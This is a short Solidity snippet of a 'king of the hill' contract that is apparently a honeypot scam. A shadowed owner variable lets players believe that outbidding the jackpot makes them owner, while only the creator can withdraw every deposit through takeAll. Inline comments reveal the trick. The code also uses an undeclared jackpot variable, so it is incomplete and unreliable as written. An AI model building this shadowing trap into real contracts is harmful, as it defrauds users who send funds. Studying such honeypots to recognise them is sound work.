contract Ownable {
    address owner = msg.sender;
    
    modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }
}

contract KingOfTheHill is Ownable {
    address public owner;

    function () public payable {
        if(msg.value > jackpot) owner = msg.sender; // local owner
        jackpot += msg.value;
    }
    function takeAll () public onlyOwner { // owner from Ownable = contract creator
        msg.sender.transfer(this.balance);
        jackpot = 0;
    }
}
